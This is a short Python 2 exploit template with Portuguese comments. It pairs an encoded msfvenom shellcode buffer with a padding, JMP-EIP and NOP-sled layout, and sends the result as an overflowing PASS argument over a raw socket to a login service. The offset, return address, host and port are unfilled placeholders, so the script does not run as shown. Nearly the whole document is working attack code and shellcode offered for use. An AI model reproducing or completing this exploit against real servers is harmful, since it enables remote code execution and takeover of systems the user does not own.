#!/usr/bin/python
import socket

buf =  b""
buf += b"\xba\x13\xbb\xb1\xc9\xd9\xec\xd9\x74\x24\xf4\x5e\x31"
buf += b"\xc9\xb1\x52\x83\xee\xfc\x31\x56\x0e\x03\x45\xb5\x53"
buf += b"\x3c\x95\x21\x11\xbf\x65\xb2\x76\x49\x80\x83\xb6\x2d"
buf += b"\xc1\xb4\x06\x25\x87\x38\xec\x6b\x33\xca\x80\xa3\x34"
buf += b"\x7b\x2e\x92\x7b\x7c\x03\xe6\x1a\xfe\x5e\x3b\xfc\x3f"
buf += b"\x91\x4e\xfd\x78\xcc\xa3\xaf\xd1\x9a\x16\x5f\x55\xd6"
buf += b"\xaa\xd4\x25\xf6\xaa\x09\xfd\xf9\x9b\x9c\x75\xa0\x3b"
buf += b"\x1f\x59\xd8\x75\x07\xbe\xe5\xcc\xbc\x74\x91\xce\x14"
buf += b"\x45\x5a\x7c\x59\x69\xa9\x7c\x9e\x4e\x52\x0b\xd6\xac"
buf += b"\xef\x0c\x2d\xce\x2b\x98\xb5\x68\xbf\x3a\x11\x88\x6c"
buf += b"\xdc\xd2\x86\xd9\xaa\xbc\x8a\xdc\x7f\xb7\xb7\x55\x7e"
buf += b"\x17\x3e\x2d\xa5\xb3\x1a\xf5\xc4\xe2\xc6\x58\xf8\xf4"
buf += b"\xa8\x05\x5c\x7f\x44\x51\xed\x22\x01\x96\xdc\xdc\xd1"
buf += b"\xb0\x57\xaf\xe3\x1f\xcc\x27\x48\xd7\xca\xb0\xaf\xc2"
buf += b"\xab\x2e\x4e\xed\xcb\x67\x95\xb9\x9b\x1f\x3c\xc2\x77"
buf += b"\xdf\xc1\x17\xd7\x8f\x6d\xc8\x98\x7f\xce\xb8\x70\x95"
buf += b"\xc1\xe7\x61\x96\x0b\x80\x08\x6d\xdc\x6f\x64\x6f\x75"
buf += b"\x18\x77\x6f\x84\x63\xfe\x89\xec\x83\x57\x02\x99\x3a"
buf += b"\xf2\xd8\x38\xc2\x28\xa5\x7b\x48\xdf\x5a\x35\xb9\xaa"
buf += b"\x48\xa2\x49\xe1\x32\x65\x55\xdf\x5a\xe9\xc4\x84\x9a"
buf += b"\x64\xf5\x12\xcd\x21\xcb\x6a\x9b\xdf\x72\xc5\xb9\x1d"
buf += b"\xe2\x2e\x79\xfa\xd7\xb1\x80\x8f\x6c\x96\x92\x49\x6c"
buf += b"\x92\xc6\x05\x3b\x4c\xb0\xe3\x95\x3e\x6a\xba\x4a\xe9"
buf += b"\xfa\x3b\xa1\x2a\x7c\x44\xec\xdc\x60\xf5\x59\x99\x9f"
buf += b"\x3a\x0e\x2d\xd8\x26\xae\xd2\x33\xe3\xce\x30\x91\x1e"
buf += b"\x67\xed\x70\xa3\xea\x0e\xaf\xe0\x12\x8d\x45\x99\xe0"
buf += b"\x8d\x2c\x9c\xad\x09\xdd\xec\xbe\xff\xe1\x43\xbe\xd5"

bytes= "A" * valor para chegar no eip + "valor do jmp eip" + "\x90" * (valor total restante-valor do payload do msfvenom) + buf
#colocar o valor dos bytes para chegar no EIP
#passar o valor de JMP EIP de tras pra frente
#\x90 e o valor do nop
#nao esquecer o valor que resta menos o valor do payload (351)
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("host",port))
	r = s.recv(1024)
	print r

	s.send("USER usuario\r\n")
	r = s.recv(1024)
	print r

	s.send("PASS "+bytes+"\r\n")
	r = s.recv(1024)
	print r
	s.close()
except:
	print "Erro ao conectar"
